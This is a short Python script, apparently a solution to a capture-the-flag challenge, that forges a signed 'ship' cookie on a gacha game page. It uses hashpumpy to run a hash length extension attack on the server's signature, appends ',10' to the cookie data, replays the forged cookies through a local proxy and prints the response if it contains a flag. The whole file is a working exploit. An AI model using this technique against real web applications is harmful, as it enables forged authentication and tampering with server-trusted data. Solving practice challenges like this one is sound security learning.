import requests
import hashpumpy

if __name__ == '__main__':
    url = 'http://ctfq.sweetduet.info:10080/~q31/kangacha.php'
    data = {'submit': 'Gacha'}
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0'}
    proxies = {'http': 'http://localhost:8080', 'https': 'https://localhost:8080'}

    res = requests.post(url=url, data=data, headers=headers, proxies=proxies, allow_redirects=False)
    ship = res.cookies['ship']
    signature = res.cookies['signature']

    hash_res = hashpumpy.hashpump(signature, ship, ',10', 21)
    cookies = {'ship': str(hash_res[1])[2:][:-1].replace('\\x', '%'), 'signature': hash_res[0]}

    res = requests.get(url=url, headers=headers, cookies=cookies, proxies=proxies)
    if res.text.find('FLAG') > -1:
        print('[+]res: {0}'.format(res.text))
